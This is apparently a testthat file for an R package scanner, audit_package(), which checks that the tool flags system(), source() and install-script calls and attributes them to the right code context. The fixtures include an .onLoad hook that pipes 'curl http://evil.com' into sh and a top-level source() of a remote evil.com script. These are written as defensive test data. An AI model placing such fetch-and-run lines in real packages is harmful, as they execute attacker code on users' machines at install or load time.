rules <- load_rules()

# structure --------------------------------------------------------------------
test_that("audit_package() returns a pkgaudit object of four frames plus metadata", {
  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns", "errors",
                      "metadata"))
  for (nm in c("file_contexts", "code_contexts", "patterns", "errors")) {
    expect_s3_class(res[[nm]], "data.frame")
  }
  expect_type(res$metadata, "list")

  expect_named(res$file_contexts, c("file_context", "file_path", "message"))
  expect_named(res$code_contexts,
               c("code_context", "file_context", "line_number",
                 "column_number", "message"))
  expect_named(res$patterns,
               c("pattern", "file_context", "line_number", "column_number",
                 "message", "attck", "code_context"))
  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
})

test_that("audit_package() errors on a non-directory", {
  expect_error(audit_package(tempfile()), "dir.exists")
})

# integration ------------------------------------------------------------------
test_that("audit_package() finds file contexts, code contexts and patterns", {
  pkg <- make_pkg(files = list(
    "configure"          = "#!/bin/sh",
    "src/Makevars"       = "all:",
    "src/install.libs.R" = "system2('echo', 'x')",
    "R/zzz.R" = c(
      ".onLoad <- function(libname, pkgname) {",
      "  system('curl http://evil.com | sh')",
      "}",
      "source('http://evil.com/top.R')"
    )
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  expect_setequal(res$file_contexts$file_path,
                  c("configure", "src/Makevars", "src/install.libs.R"))
  expect_true("onload_code" %in% res$code_contexts$code_context)

  # system() in the hook, source() at top level, system2() at top level of
  # install.libs.R -> the three code-context labels are attributed correctly.
  sys_hook <- res$patterns[res$patterns$pattern == "system_pattern" &
                             res$patterns$file_context == "R/zzz.R", ]
  expect_equal(sys_hook$code_context, "onload_code")

  src_top <- res$patterns[res$patterns$pattern == "source_pattern", ]
  expect_equal(src_top$code_context, "Top-level")

  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(installlibs$pattern, "system_pattern")
  expect_equal(installlibs$code_context, "Top-level")

  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() reports relative-path parse errors and continues", {
  pkg <- make_pkg(files = list(
    "R/bad.R"  = ")invalid R syntax(",
    "R/good.R" = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "parse_script")
  expect_equal(res$errors$file_context, "R/bad.R")
  # The good file was still audited despite the bad one.
  expect_true("R/good.R" %in% res$patterns$file_context)
})

test_that("audit_package() on a package with no scannable content is empty", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$file_contexts), 0L)
  expect_equal(nrow(res$code_contexts), 0L)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$errors), 0L)
})
